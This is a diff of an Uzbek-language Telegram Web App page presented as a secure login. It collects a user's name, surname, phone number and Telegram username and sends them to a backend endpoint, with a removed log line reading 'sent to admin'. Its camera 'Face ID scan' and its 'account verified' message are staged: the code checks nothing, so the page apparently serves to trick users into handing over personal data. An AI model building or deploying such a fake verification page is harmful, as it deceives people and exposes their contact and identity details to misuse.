@@ -3,141 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>YusufxonPro Connect</title>
+    <title>YusufxonPro - Xavfsiz Kirish</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --blue: #007aff; --bg: #f2f2f7; }
-        body { font-family: -apple-system, sans-serif; background: var(--bg); margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        
-        .card { background: #fff; width: 90%; max-width: 380px; padding: 30px; border-radius: 35px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); text-align: center; }
-        
-        /* Telegram Header */
-        .tg-header { display: flex; align-items: center; gap: 12px; background: #f8f9fa; padding: 12px; border-radius: 20px; margin-bottom: 20px; text-align: left; border: 1px solid #eee; }
-        .tg-header img { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--blue); }
-        .tg-header h4 { margin: 0; font-size: 14px; }
-        .tg-header p { margin: 0; font-size: 11px; color: var(--blue); font-weight: 700; }
+        :root { --blue: #007aff; --bg: #f2f2f7; --card: #ffffff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body { background: var(--bg); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
 
-        input { width: 100%; padding: 16px; margin: 8px 0; border: none; background: #f2f2f7; border-radius: 15px; font-size: 16px; outline: none; box-sizing: border-box; }
-        .btn { width: 100%; padding: 18px; border: none; border-radius: 18px; background: #000; color: #fff; font-weight: 800; cursor: pointer; margin-top: 10px; font-size: 16px; }
+        /* Profil Header */
+        .login-card { width: 90%; max-width: 400px; background: var(--card); padding: 30px; border-radius: 35px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; }
+        .tg-header { display: flex; align-items: center; gap: 15px; background: #f8f9fa; padding: 15px; border-radius: 20px; margin-bottom: 25px; border: 1px solid #eee; text-align: left; }
+        .tg-header img { width: 55px; height: 55px; border-radius: 50%; border: 2px solid var(--blue); }
+        .tg-header h4 { font-size: 15px; margin: 0; }
+        .tg-header p { font-size: 12px; color: var(--blue); font-weight: 700; margin: 0; }
 
-        /* Face ID Overlay */
-        #face-id-ui { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; color: #fff; }
-        .cam-circle { width: 280px; height: 280px; border-radius: 50%; border: 4px solid var(--blue); overflow: hidden; position: relative; box-shadow: 0 0 30px var(--blue); }
+        /* Form */
+        .input-group input { width: 100%; padding: 16px; background: #f2f2f7; border: none; border-radius: 18px; margin-bottom: 12px; font-size: 16px; outline: none; }
+        .btn { width: 100%; padding: 20px; border-radius: 20px; border: none; font-weight: 800; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn-black { background: #000; color: #fff; }
+
+        /* Face ID UI */
+        #face-ui { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; color: #fff; }
+        .cam-box { width: 280px; height: 280px; border-radius: 50%; border: 4px solid var(--blue); overflow: hidden; position: relative; box-shadow: 0 0 30px var(--blue); }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .scan-bar { position: absolute; width: 100%; height: 6px; background: var(--blue); top: 0; animation: scan 2s infinite linear; box-shadow: 0 0 15px var(--blue); }
-        @keyframes scan { 100% { top: 100%; } }
+        .scan-line { position: absolute; width: 100%; height: 5px; background: var(--blue); top: 0; animation: scan 2s infinite linear; box-shadow: 0 0 15px var(--blue); }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
 
-        /* Final Loading Screen */
+        /* Loading Screen (5 soniya) */
         #loader { position: fixed; inset: 0; background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 2000; text-align: center; }
-        .timer { font-size: 80px; font-weight: 900; color: var(--blue); margin: 20px 0; }
+        .count-num { font-size: 90px; font-weight: 900; color: var(--blue); }
+        .loader-text { font-weight: 700; color: #888; letter-spacing: 1px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="card" id="form-box">
+    <div class="login-card" id="step-form">
         <div class="tg-header">
             <img id="u-img" src="">
-            <div>
+            <div class="tg-info">
                 <h4 id="u-name">Connect...</h4>
                 <p id="u-tag">@username</p>
             </div>
         </div>
-        <input type="text" id="name" placeholder="Ism">
-        <input type="text" id="surname" placeholder="Familiya">
-        <input type="tel" id="phone" value="+998 ">
-        <button class="btn" onclick="startFaceID()">TASDIQLASH</button>
+        
+        <div class="input-group">
+            <input type="text" id="inp-name" placeholder="Ism">
+            <input type="text" id="inp-surname" placeholder="Familiya">
+            <input type="tel" id="inp-phone" value="+998 ">
+        </div>
+
+        <button class="btn btn-black" onclick="openFaceID()">TASDIQLASH</button>
     </div>
 
-    <div id="face-id-ui">
-        <div class="cam-circle">
-            <video id="video" autoplay playsinline></video>
-            <div class="scan-bar"></div>
+    <div id="face-ui">
+        <div class="cam-box">
+            <video id="webcam" autoplay playsinline></video>
+            <div class="scan-line"></div>
         </div>
-        <h2 style="margin-top: 30px; letter-spacing: 2px;">YUZNI TUTING</h2>
-        <p style="color: #888;">Identifikatsiya qilinmoqda...</p>
+        <h2 style="margin-top: 30px; letter-spacing: 2px;">YUZNI SKANERLASH</h2>
+        <p style="color: #8e8e93; margin-top: 10px;">Iltimos, yuzingizni markazga tuting</p>
     </div>
 
     <div id="loader">
-        <p style="font-weight: 800; color: #555; letter-spacing: 1px;">AKAUNT ANIQLANMOQDA...</p>
-        <div class="timer" id="timer-num">5</div>
-        <div id="status-text" style="font-weight: 600; color: green;"></div>
-        <p style="position: absolute; bottom: 40px; font-size: 12px; color: #bbb;">YUSUFXONPRO SECURITY 24/7</p>
+        <p class="loader-text">AKKAUNT TEKSHIRILMOQDA...</p>
+        <div class="count-num" id="timer">5</div>
+        <div id="final-status" style="margin-top: 20px; font-weight: 800; color: #34c759;"></div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Telegram Profilini O'rnatish
+        // Telegram profil ma'lumotlarini yuklash
         const user = tg.initDataUnsafe?.user || { first_name: "Yusufxon", username: "pro" };
         document.getElementById('u-img').src = user.photo_url || "https://ui-avatars.com/api/?name=" + user.first_name;
         document.getElementById('u-name').innerText = user.first_name;
         document.getElementById('u-tag').innerText = "@" + (user.username || "user");
 
-        let stream = null;
+        let videoStream = null;
 
-        // Face ID boshlash
-        async function startFaceID() {
-            const nameVal = document.getElementById('name').value;
-            if(!nameVal || nameVal.length < 2) return alert("Iltimos, ismingizni to'liq yozing!");
-
-            document.getElementById('face-id-ui').style.display = 'flex';
+        // Bosqich 1: Face ID ni ochish
+        async function openFaceID() {
+            if(!document.getElementById('inp-name').value) return alert("Ismingizni kiriting!");
             
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('video').srcObject = stream;
+            document.getElementById('face-ui').style.display = 'flex';
 
-                // 3 soniya skaner qiladi
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('webcam').srcObject = videoStream;
+
+                // 3 soniya skaner qiladi va keyingi bosqichga o'tadi
                 setTimeout(() => {
-                    if(stream) stream.getTracks().forEach(track => track.stop());
-                    document.getElementById('face-id-ui').style.display = 'none';
-                    runFinalStep();
+                    if(videoStream) videoStream.getTracks().forEach(t => t.stop());
+                    document.getElementById('face-ui').style.display = 'none';
+                    startFinalLoading();
                 }, 3000);
-            } catch (err) {
-                alert("Kameraga ruxsat berish shart!");
-                document.getElementById('face-id-ui').style.display = 'none';
+            } catch (e) {
+                alert("Kameraga ruxsat berilmadi!");
+                document.getElementById('face-ui').style.display = 'none';
             }
         }
 
-        // Oxirgi bosqich: Python bilan bog'lanish va 5 soniya kutish
-        function runFinalStep() {
+        // Bosqich 2: 5 soniyalik kutish va Python bilan bog'lanish
+        function startFinalLoading() {
             document.getElementById('loader').style.display = 'flex';
             
-            const userData = {
-                name: document.getElementById('name').value,
-                surname: document.getElementById('surname').value,
-                phone: document.getElementById('phone').value,
+            const data = {
+                name: document.getElementById('inp-name').value,
+                surname: document.getElementById('inp-surname').value,
+                phone: document.getElementById('inp-phone').value,
                 username: user.username
             };
 
-            // Python Aiohttp Backend'ga yuborish
+            // Python (aiohttp) ga yuborish
             fetch('/api/verify', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(userData)
-            }).then(() => console.log("Adminga yuborildi"));
+                body: JSON.stringify(data)
+            });
 
-            // 5 soniyalik sanoq
             let timeLeft = 5;
             const interval = setInterval(() => {
                 timeLeft--;
-                document.getElementById('timer-num').innerText = timeLeft;
-                
+                document.getElementById('timer').innerText = timeLeft;
+
                 if(timeLeft === 2) {
-                    document.getElementById('status-text').innerText = "AKAUNT TASDIQLANDI ✅";
+                    document.getElementById('final-status').innerText = "AKKAUNT TASDIQLANDI ✅";
+                    tg.HapticFeedback.notificationOccurred('success');
                 }
 
                 if(timeLeft <= 0) {
                     clearInterval(interval);
-                    alert("Tabriklaymiz! YusufxonPro tizimiga kirdingiz.");
+                    alert("YusufxonPro tizimiga xush kelibsiz!");
                     document.getElementById('loader').style.display = 'none';
-                    tg.close(); // Botga qaytish
+                    tg.close();
                 }
             }, 1000);
         }
 
-        // Nomer formati uchun
-        document.getElementById('phone').addEventListener('input', function (e) {
+        // Telefon nomer formati
+        document.getElementById('inp-phone').addEventListener('input', function (e) {
             let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})/);
             e.target.value = !x[2] ? x[1] : '+' + x[1] + ' (' + x[2] + ') ' + x[3] + (x[4] ? '-' + x[4] : '') + (x[5] ? '-' + x[5] : '');
         });
